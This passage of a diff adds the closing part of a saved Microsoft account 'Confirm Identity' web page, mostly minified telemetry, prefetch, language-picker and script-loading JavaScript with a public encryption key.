+},t.prototype.applyClientEventBindings=function(t){if(this._enabled){for(var n=this,i=t.querySelectorAll("["+p.ReportEventIdAttr+"]"),r=t.getAttribute(p.DataViewId)?t.getAttribute(p.DataViewId):"",o=function(t){var o=i[t];if(o.getAttribute(p.ReportEventHandlerAttachedAttr)){return{"value":void 0}}var s=o.getAttribute(p.ReportEventIdAttr),a=o.getAttribute(p.ReportEventValueAttr),c=o.getAttribute(p.ReportEventTriggerAttr);if(a){if(0===a.indexOf(p.ReportEventValueAttrBinding)){var u=a.slice(p.ReportEventValueAttrBinding.length).trim();
+a=o.getAttribute(u)}}else{a=n._inferClientEventValue(o)}var d=[p.Click,p.Dblclick,p.Keypress,p.Cut,p.Copy,p.Paste,p.Change,p.Focus,p.Scroll,p.Submit,p.Reset],l=c&&c.split(",")||[p.Click];if(l.length>0){for(var h=function(t){-1!==l.indexOf(d[t])&&(e.AddListener(o,d[t],function(){var e;e=d[t],a||(a=e),n.appendClientEvent(s,a,r)}),o.setAttribute(p.ReportEventHandlerAttachedAttr,"1"))},v=0;v<d.length;v++){h(v)}}},s=0;s<i.length;s++){var a=o(s);if("object"==typeof a){return a.value}}}},t.prototype._getCurrentTime=function(){return Date.now?Date.now():(new Date).getTime()
+},t.prototype.hasPageEvents=function(){return Object.keys(this._nonIndexedDataPoint).length>0},t.prototype._addUnloadHandlers=function(){var t=this,n=function(){t.post(!0)};e.AddListener(a.document,"visibilitychange",function(){"hidden"===a.document.visibilityState&&n()}),e.AddListener(a,"pagehide",n)},t.prototype._inferClientEventValue=function(t){var e;if(t){switch(t.tagName.toLowerCase()){case p.Input:t instanceof HTMLInputElement?t.type!==p.Radio&&t.type!==p.Checkbox||(e=t.checked?"checked":"unchecked"):t instanceof HTMLButtonElement&&(e=t.type===p.Button?"clicked":t.getAttribute(p.ReportEventIdAttr));
+break;case p.A:t instanceof HTMLAnchorElement&&(e="clicked");break;default:e=t.getAttribute(p.ReportEventIdAttr)}}return e},t.prototype._setPerRequestDataPoints=function(){this.set("ServerPageID",this._serverPageID,!0,"data"),this.set("PageName",this._clientEventsConfig.pageName,!0,"data"),this.set("ServiceID",this._serviceID,!0,"data"),this.set("id",this._clientEventsConfig.appId,!0,"app"),this.set("ver",this._clientEventsConfig.serverDetails.version,!0,"app"),this.set("name",this._clientEventsConfig.defaultEventName,!0,"app"),this.set("sesId",this._getCorrelationID(),!0,"app"),this.set("userId","p: "+this._clientEventsConfig.actorID,!0,"app"),this.set("env",this._clientEventsConfig.environment,!0,"app"),this.set("role",this._getCloudrole(),!0,"cloud"),this.set("roleInstance",this._clientEventsConfig.serverDetails.roleInstance,!0,"cloud"),this.set("roleVer",this._clientEventsConfig.serverDetails.version,!0,"cloud")
+},t.prototype._getCloudrole=function(){return this._clientEventsConfig.serverDetails.datacenter||"-"},t.prototype._getCorrelationID=function(){var t=this._clientEventsConfig.correlationID;return t||(t=e.GenerateGUID(),this._clientEventsConfig.correlationID=t),t},t.prototype._isNumeric=function(t){return!isNaN(t)},t.prototype._getNumericValue=function(t){return Number(t)},t}();t.TelemetryHelper=c}(i||(i={})),e.TelemetryHelper=i.TelemetryHelper},function(t){t.exports={"ReportEventIdAttr":"data-report-event","ReportEventValueAttr":"data-report-value","ReportEventTriggerAttr":"data-report-trigger","ReportEventValueAttrBinding":"attr:","ReportEventHandlerAttachedAttr":"data-report-attached","DataViewId":"data-viewid","NonIndexedDataPointKey":"Data","Click":"click","Dblclick":"dblclick","Keypress":"keypress","Cut":"cut","Copy":"copy","Paste":"paste","Change":"change","Focus":"focus","Scroll":"scroll","Submit":"submit","Reset":"reset","Input":"input","A":"a","Radio":"radio","Checkbox":"checkbox","Button":"button"}
+}])}),function(){function t(){var t=i.serverDetails.ver.v,e=Array.isArray(t)&&t.length>0?t.join("."):"-";return e}function e(t,e){for(var n in t){if(t.hasOwnProperty(n)&&t[n]===e){return n}}return e?e.toString():""}var n=window,i=n.$Config||{},r=i.clientEvents||{},o=i.uaid,s=n.$B||{};if("performance"in window==!1&&(window.performance={}),Date.now=Date.now||function(){return(new Date).getTime()},"now"in window.performance==!1){var a=Date.now();window.performance.timing&&window.performance.timing.navigationStart&&(a=window.performance.timing.navigationStart),window.performance.now=function(){return Date.now()-a
+}}if(!o&&"function"==typeof URLSearchParams){var p=new URLSearchParams(window.location.search);o=p.get("uaid")}r.correlationID=o,r.hostPageID=i.hpgid,r.pageName=e(i.cpgids,i.hpgid),r.actorID=i.cid,r.appId=i.appId,r.environment=i.isINT?"int":"prod",r.serverDetails={"datacenter":i.serverDetails.dc,"roleInstance":i.serverDetails.ri,"version":t()},s.IE&&r.appInsightsConfig&&(r.appInsightsConfig.PostChannel?r.appInsightsConfig.PostChannel.disableXhrSync=!0:r.appInsightsConfig.PostChannel={"disableXhrSync":!0}),n.$Telemetry=new Microsoft.Identity.UX.Telemetry.TelemetryHelper(r),$Do.register("$Telemetry")
+}();
+
+//]]></script>
+
+    
+    
+    <script crossorigin="anonymous" src="https://acctcdn.msftauth.net/accountcorepackage_qMyhjGlySr2hT0nzYSOg0w2.js?v=1" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-SeNGtmCrt57fVsPMbeFrDFHuX2qnGqOIRTDXsj0I7kTWUG+GNuul1tkWwUAOZwIz"></script>
+    <script crossorigin="anonymous" src="https://acctcdn.msftauth.net/confirmidentity_eRpiOecwN_KiNkBy8R1eag2.js?v=1" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-/lL3nwGEfSuS+aVHBKh9mSpsHcibpgyeCnEfH+mS9cuI5N4NA9tRXBcnV17IjEUo"></script>
+    
+<script type="text/javascript"> var Key="e=10001;m=d0fa1d37fa0bb621a8cbb6669249ba1d14bbd5058592f050240d8c3b68674f0e28283018a7753f4377aaa3b3645e5f119a0032129a0a64322f74888aed3519de49e98c5b3c221460218140616f01ac5e9f2f8042e2749b8a89112f15310690dad7531f6758c0c65e525dff7859283b566a5b154352c57161cd24e59133a61432f461583e40cac749d722909dfcf0edd6af3cbc9a25e639b0caaf55e8c7b08b53c7d52038b48e1b26ad40f8bb84b3bb9c92bc9b947d2ab5ae4664a5093a4895af09659a78c9393797ea76b5b9416a45025e2ab3ea1627f08d85abd22e156d3e842efbaa1d0e1e4885028b2bc0aa7be8e444799e96fce0444f2b56bd14c0244b4d"; var randomNum="3F8BB5F16B5D06FE0E962935C45F3345437C1BEB447007642FE581FFC68DA2176CD3F01147D965C43272EFAB33E863688645E04D9BE5394C2ECFB812CA3B18FDF8890A51C34741525E11553B9A1B637A9B0071BC3FC9571739365AF4295E065AFA1FA19F"; var SKI="AF99E0B5CB4A0FCD26625571F926665CC11334CE";</script>
+
+
+
+    
+    <div style="display: none" id="PageId">
+        i6106</div>
+
+    
+    <script type="text/javascript">//<![CDATA[
+!function(t){var e;!function(t){var e;!function(t){var e;!function(t){function e(t,e){return t?e&&e.length>6&&("data:"===e.substr(0,5).toLowerCase()||"http:"===e.substr(0,5).toLowerCase()||"https:"===e.substr(0,6).toLowerCase())?e:t+e:e}t.getImagePath=e}(e=t.ImageHelper||(t.ImageHelper={}))}(e=t.Util||(t.Util={}))}(e=t.Account||(t.Account={}))}(wLive||(wLive={})),function(t){var e;!function(t){var e;!function(t){var e;!function(t){function e(t,e){var r="";a.getComputedStyle(document.body)&&a.getComputedStyle(document.body).backgroundColor&&(r=a.getComputedStyle(document.body).backgroundColor.toLowerCase().replace(new RegExp(" ","g"),""));
+var o="rgb(0,0,0)"===r||"#000000"===r||"#000"===r,n="rgb(255,255,255)"===r||"#ffffff"===r||"#fff"===r,g="rgb(32,32,32)"===r||"#202020"===r,i="rgb(45,50,54)"===r||"#2d3236"===r,c="rgb(255,250,239)"===r||"#fffaef"===r;return e.forBlackBackground&&(o||g||i)?e.forBlackBackground:e.forWhiteBackground&&(n||c)?e.forWhiteBackground:t}function r(t,e){return t?e&&e.length>6&&("data:"===e.substr(0,5).toLowerCase()||"http:"===e.substr(0,5).toLowerCase()||"https:"===e.substr(0,6).toLowerCase())?e:t+e:e}function o(t,o,a){return r(t,e(o,a))
+}var a=window;t.getHighContrastImage=e,t.getImagePath=r,t.getHighContrastImageUrl=o}(e=t.HighContrast||(t.HighContrast={}))}(e=t.Util||(t.Util={}))}(e=t.Account||(t.Account={}))}(wLive||(wLive={})),$Do&&$Do.when(["doc.ready","jQuery"],0,function(){function t(){var t=$PageHelper.byId("bannerBackButton");if(t.length>0&&t.on("click",function(){o&&o.$&&o.$.triggerHandler(o.back)}),a&&c){var e=$PageHelper.byClassName("logo"),r=n.getImagePath(c.baseUrl,c.msLogo),g=n.getImagePath(c.baseUrl,c.msLogoWhite),u=a.getHighContrastImage(r,{"forBlackBackground":g});
+e.length>0&&u&&u!==r&&e.attr("src",u);var f=$PageHelper.byId("backArrowImage"),s=i.isRTL,l=s?c.rightArrow:c.leftArrow,h=s?c.rightArrowWhite:c.leftArrowWhite,d=n.getImagePath(c.baseUrl,l),b=n.getImagePath(c.baseUrl,h),m=a.getHighContrastImage(d,{"forBlackBackground":b});f.length>0&&m&&m!==d&&f.attr("src",m)}}var e=window,r=e&&e.wLive&&e.wLive.Account,o=r&&r.PageEvents,a=r&&r.Util&&r.Util.HighContrast,n=r&&r.Util&&r.Util.ImageHelper,g=e&&e.$Config&&e.$Config.WLXAccount,i=g&&g.convergedFrameConfig&&g.convergedFrameConfig.page,c=i&&i.imgs;
+t()});
+
+//]]></script>
+    
+    <script type="text/javascript">
+        $PageHelper.onLoad(window.wLive.Account.Page.ConfirmIdentity);
+    </script>
+
+    
+
+    <script type="text/javascript">
+        $Do.when("jQuery", 0, function ()
+        {
+            $PageHelper.onLoad(evt_master_onload);
+        });
+    </script>
+
+    
+
+    <script type="text/javascript">//<![CDATA[
+!function(){$Do.when(["jQuery","doc.ready"],0,function(){var e=$PageHelper.byId("uxp_ftr_modal_language");e.on("shown.bs.modal",function(){$PageHelper.byTagName("select",e).focus()}),e.on("show.bs.modal",function(){$PageHelper.byClassName("modal-body",e).load("/handlers/languagepicker.mvc",function(n,o,a){a&&200===a.status&&n&&(e.off("show.bs.modal"),$PageHelper.queryAll(".modal-footer .btn",e).on("click",function(){var n=$PageHelper.queryAll(".modal-content form",e),o=n.find("input"),a=n.find("#lpDropDown");
+n&&n.length>0&&o&&o.length>0&&a&&a.length>0&&$PageHelper.post("/handlers/languagesave.mvc?canary="+o.val()+"&lang="+a.val()).then(function(e){if(e.rsp){try{window.top.location.href=$f.replaceQs(window.top.location.href.toString(),"mkt",e.rsp)}catch(n){}}})}))})})})}();
+
+//]]></script>
+    
+
+    
+    
+    <script type="text/javascript">
+        if (window.addEventListener)
+        {
+            window.addEventListener("load", function ()
+            {
+                $Utility.firePageLoadEvent("Account_ConfirmIdentityPage");
+            }, false);
+        }
+    </script>
+    
+<script type="text/javascript">
+//<![CDATA[
+(function () {
+var $NonBlockingResources={"res":[{"src":"https\u003a\u002f\u002facctcdn.msftauth.net\u002fdatarequestpackage_h-_7C7UzwdefXJT9njDBTQ2.js","integrity":"sha384-GffFHiHx8YwM3kORLOXe0Cy0QVBcEIjG9uqAtsUwiPjelKOqZ\u002fVT6ys9ZC8oYhe8"}]};window.$Do&&window.$Do.register("$NonBlockingResources",0,true);
+!function(n,o){function e(){for(var e=new n.$Loader,r=o.res,i=0;i<r.length;i++){var t=r[i];t&&e.Add(t.src,t.id,t.integrity)}e.Load()}o&&o.res&&0!=o.res.length&&$Do.when("doc.load",function(){setTimeout(e,10)})}(window,$NonBlockingResources);
+
+
+})();
+//]]></script>
+
+    
+<script type="text/javascript">
+//<![CDATA[
+(function () {
+var $Prefetch={"rfPre":1,"delay":7500,"maxHistory":4,"maxAge":43200,"ageRes":1440,"name":"clrc","fetch":[{"path":"\u002fResources\u002fimages\u002fmicrosoft_logo_7lyNn7YkjJOP0NwZNw6QvQ2.svg","hash":"d7PFy\u002f1V","co":1},{"path":"\u002fResources\u002fimages\u002ffavicon.ico","hash":"\u002bVC\u002bx0R6","co":1},{"path":"\u002fResources\u002fimages\u002fAppCentipede\u002fAppCentipede_Microsoft_HFeToeM4u6fzMQF_f_rQ5Q2.svg","hash":"WTWmWDKx","co":1},{"path":"\u002fResources\u002fimages\u002fMicrosoft_Logotype_Gray_X-qkgtg8KmnQEvm_9mDTcw2.svg","hash":"hpK6IkLs","co":1},{"path":"\u002fResources\u002fimages\u002fAppCentipede\u002fAppCentipede_Microsoft_white_ufRYlllWOw4YyDRiKcBvxQ2.svg","hash":"GygCh3oD","co":1},{"path":"\u002fResources\u002fimages\u002fMicrosoft_Logotype_White_4MYDQRab31HKDWWN-1HafA2.svg","hash":"Dn72E5AG","co":1},{"path":"\u002fResources\u002fimages\u002f2_vD0yppaJX3jBnfbHF1hqXQ2.svg","hash":"FutSZdvn","co":1},{"path":"\u002fResources\u002fimages\u002fArrows\u002fleft_qcwoJO81F7bEFg3Pj_fUEA2.svg","hash":"qXzd9wBr","co":1}],"mode":0,"useSameSite":1};window.$Do&&window.$Do.register("$Prefetch",0,true);
+!function(e,t,n){function r(e){X.appendLog&&X.appendLog("Client Prefetch: "+e)}function i(){try{for(var e=t.cookie.split(";"),r=0;r<e.length;r++){var i=e[r];if(i){var o=i.indexOf("=");if(-1!==o){var u=i.substr(0,o).trim();if(u===n.name){var a=i.substr(o+1);return JSON.parse(c(a))}}}}}catch(f){}return{}}function o(e,t,n){return e.replace(t,n)}function c(e){return e=o(e,/%5c/g,"\\"),e=o(e,/%3e/g,">"),e=o(e,/%3d/g,"="),e=o(e,/%3c/g,"<"),e=o(e,/%3b/g,";"),e=o(e,/%3a/g,":"),e=o(e,/%2c/g,","),e=o(e,/%27/g,"'"),e=o(e,/%22/g,'"'),e=o(e,/%20/g," "),e=o(e,/%25/g,"%")
+}function u(e){return e=o(e,/%/g,"%25"),e=o(e,/ /g,"%20"),e=o(e,/"/g,"%22"),e=o(e,/'/g,"%27"),e=o(e,/,/g,"%2c"),e=o(e,/:/g,"%3a"),e=o(e,/;/g,"%3b"),e=o(e,/</g,"%3c"),e=o(e,/=/g,"%3d"),e=o(e,/>/g,"%3e"),e=o(e,/\\/g,"%5c")}function a(e,r){var i=new Date;i.setTime(i.getTime()+k*C);var o=n.name+"="+u(JSON.stringify(e))+";expires="+i.toUTCString()+";path=/;secure";o+=r&&"none"!==r.toLowerCase()?";SameSite="+r:f(),t.cookie=o}function f(){return N?";SameSite=None":""}function h(e,t){if(e){if(e.indexOf){return e.indexOf(t)
+}for(var n=0;n<e.length;n++){if(e[n]===t){return n}}}return-1}function g(e,t){return-1!==h(e,t)}function s(e,t){var n=h(e,t);return-1!==n?(e.splice(n,1),!0):!1}function l(e,t){for(var n in e){if(e.hasOwnProperty(n)&&!t(n,e[n])){break}}}function d(){var e=(new Date).getTime(),t=D*C;return Math.round(L.getTime()>e?e/t:(e-L.getTime())/t)}function p(e,t){var n=!1;if(t&&t.length>0){n=!0;for(var r=0;r<t.length;r++){delete e[t[r]]}}return n}function v(e){var t=d()-k,n=t+2*k,r=null,i=0,o=[];return l(e,function(c){return t>c||c>n?o.push(c):(0===e[c].length?o.push(c):(null===r||r>c)&&(r=c),i++),!0
+}),null!==r&&i>P&&o.push(r),p(e,o)}function m(e,t,n){r("Fetched: "+e+" Hash: "+t+" isRefresh: "+n);var o=i(),c=d(),u=!1,f=!1;if(l(o,function(e,n){return g(n,t)?(e!==c?s(o[e],t)&&(f=!0):u=!0,!1):!0}),!u){var h=o[c]||[];h.push(t),o[c]=h,f=!0}f|=v(o),f&&a(o),b()}function T(t,n,i,o){var c={"method":"GET"};i&&(c.mode="cors"),e.fetch(t,c).then(function(e){200===e.status?m(t,n,o):(r("Unexpected response - "+e.status),b())}).then(null,function(e){r("Failed - "+e),b()})}function S(){if(e.XMLHttpRequest&&!A){return new XMLHttpRequest
+}if(e.ActiveXObject){try{return new ActiveXObject("Msxml2.XMLHTTP")}catch(t){}try{return new ActiveXObject("Microsoft.XMLHttp")}catch(t){}}return null}function w(e,t,n,i,o){r("Fetching - "+t),e.onload=function(){m(t,n,o)},e.onerror=function(){r("XHR failed!"),b()},e.ontimeout=function(){r("XHR timed out!"),b()};try{e.open("GET",t),e.withCredentials=i&&!$,e.send()}catch(c){$?setTimeout(function(){m(t,n,o)},0):($=!0,w(e,t,n,!1,o))}}function O(t,n,i,o){if(e.fetch){return void T(t,n,i,o)}var c=S();return null!==c?void w(c,t,n,i,o):void r("Unable to identify a transport option!")
+}function b(){var e=n.fetch;if(H<e.length&&e[H]){var t=e[H];O(t.path,t.hash,t.co||!1,t.rf||!1),H++}}function y(e){if(e){try{var n=t.createElement("link");n.rel="prefetch",n.href=e,t.head.appendChild(n)}catch(r){}}}function x(){r("Starting"),b(),b()}function M(){for(var t=e.$Config||e.ServerData||{},r=n.fetch,i=n.mode||-1,o=-1,c=0;c<r.length;c++){0!==o&&i>=3&&(o=r[c].rf?1:0),J&&!A&&y(r[c].path||{})}t.prefetchPltMode=o}if(n&&n.fetch&&0!==n.fetch.length){var X=e.$Debug||{},H=0,C=6e4,L=new Date(2019),P=n.maxHistory||4,k=n.maxAge||20160,D=n.ageRes||1440,R=n.delay||5e3,J=n.rfPre||!1,N=n.useSameSite||!1,A=void 0!==(e._phantom||e.callPhantom),$=!1;
+JSON&&JSON.parse&&(n.clearCookie=function(){t.cookie=n.name+"=; expires=Thu, 01 Jan 1970 00:00:01 GMT;secure"+f()},e.$Do.when("doc.load",function(){setTimeout(x,R),setTimeout(M,0)}))}}(window,document,$Prefetch);
+
+
+})();
+//]]></script>
+
+    
+  
+<script src="https://acctcdn.msftauth.net/oneds_CBxZrnSxLbjHuOGn7pHqpg2.js?v=1" type="text/javascript"></script></body>
